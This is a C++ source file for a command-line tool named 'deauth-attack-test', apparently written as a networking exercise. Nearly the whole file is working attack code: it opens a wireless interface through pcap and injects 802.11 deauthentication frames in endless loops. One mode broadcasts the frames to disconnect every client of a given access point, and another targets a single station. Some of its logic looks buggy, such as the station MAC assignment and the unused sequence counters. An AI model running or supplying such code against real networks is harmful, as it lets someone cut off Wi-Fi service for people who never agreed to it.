#include "pch.h"
#include "mac.h"
#include "radiotap.h"
#include "dot11.h"
#include "deauth.h"
#include "util.h"

using namespace std;

struct Param {
    char* dev_ = nullptr;
    Mac apMac_{ Mac::nullMac() };
    Mac stMac_{ Mac::nullMac() };
    bool authMode_ = false;

    static void usage() {
        printf("syntax : deauth-attack-test <interface> <ap mac> [<station mac> [-auth]]\n");
        printf("sample : deauth-attack-test mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
    }
} param;

int main(int argc, char* argv[]) {
    if (argc < 3) {
        Param::usage();
        return -1;
    }

    param.dev_ = argv[1];
    param.apMac_ = Mac(argv[2]);

    if (argc >= 4) {
        if (strcmp(argv[3], "-auth") != 0) {
            param.stMac_ = Mac(argv[3]);
        } else {
            param.authMode_ = true;
        }
    }

    if (argc >= 5) {
        if (strcmp(argv[4], "-auth") == 0)
            param.authMode_ = true;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return NULL - %s\n", param.dev_, errbuf);
        return -1;
    }

    // Parse MAC Address
    Mac apMac(param.apMac_);
    Mac stMac;
    if (param.stMac_.isNull()) {
        stMac = Mac(param.stMac_);
    }

    // printf("AP MAC : %s\n", apMac.toString().c_str());
    // printf("ST MAC : %s\n", stMac.toString().c_str());

    DeauthPkt deauthPkt(pcap, apMac, stMac, param.authMode_);

    if (param.stMac_.isNull()) {
        // Broadcast Mode
        printf("=== Broadcast Mode ===\n");
        printf("AP MAC : %s\n", apMac.toString().c_str());
        printf("TARGET : FF:FF:FF:FF:FF:FF (broadcast)\n\n");

        Mac target{ Mac::broadcastMac() };
        int count = 0;
        uint16_t seq = 0;

        std::vector<uint8_t> pkt = deauthPkt.createDeauth(target, apMac, apMac, seq);

        while (1) {
            seq++;

            int res = pcap_inject(pcap, pkt.data(), pkt.size());
            if (res < 0) {
                fprintf(stderr, "failed: pcap_inject - %s\n", errbuf);
                return -1;
            }
            printf("[%d] Deauth Packet sended.\n", ++count);
            usleep(100000);
        }
    } else if (!param.stMac_.isNull() && param.authMode_ == false) {
        // Unicast Mode
        printf("=== Unicast Mode ===\n");
        printf("AP MAC : %s\n", apMac.toString().c_str());
        printf("ST MAC : %s\n", stMac.toString().c_str());

        int count = 0;
        uint16_t seq_ap = 0;
        uint16_t seq_st = 0;

        std::vector<uint8_t> pkt_ap = deauthPkt.createDeauth(apMac, stMac, apMac, seq_ap);
        std::vector<uint8_t> pkt_st = deauthPkt.createDeauth(stMac, apMac, apMac, seq_st);

        while (1) {
            seq_ap++;

            int res_ap = pcap_inject(pcap, pkt_ap.data(), pkt_ap.size());
            if (res_ap < 0) {
                fprintf(stderr, "failed: pcap_inject - %s\n", errbuf);
                return -1;
            }
            usleep(50000);

            seq_st++;

            int res_st = pcap_inject(pcap, pkt_st.data(), pkt_st.size());
            if (res_st < 0) {
                fprintf(stderr, "failed: pcap_inject - %s\n", errbuf);
                return -1;
            }
            
            printf("[%d] Deauth Packet sended.\n", ++count);
            usleep(100000);
        }
    }

    pcap_close(pcap);
    return 0;
}